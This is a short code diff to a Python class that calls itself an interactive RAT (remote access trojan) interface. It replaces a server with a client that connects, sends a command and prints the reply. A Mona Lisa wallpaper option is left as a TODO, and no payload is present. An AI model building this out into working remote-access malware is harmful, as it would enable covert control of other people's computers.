@@ -1,4 +1,4 @@
-import server
+import client
 
 class LeLouvre:
     def __init__(self):
@@ -7,7 +7,14 @@ class LeLouvre:
             "1": "Run Server",
             "2": "Set Mona Lisa as desktop background"
         }
-        self.server = server.Server()
+        self.client = client.Client()
+
+    """ Establish a connection to remote RAT interface. """
+    def connect_to_server(self):
+        self.client.connect()
+    
+    def disconnect_from_server(self):
+        self.client.close()
 
     """ Runs an interactive CLI RAT interface. """
     def run_rat_interface(self):
@@ -32,7 +39,10 @@ class LeLouvre:
     def execute_command(self, command_key):
         # Establish server for client connection
         if command_key == "1":
-            self.server.host()
+            self.connect_to_server()
+            resp = self.client.message("1")
+            print(resp)
+            self.disconnect_from_server()
         # TODO: Set background to Mona Lisa
         elif command_key == "2":
             pass
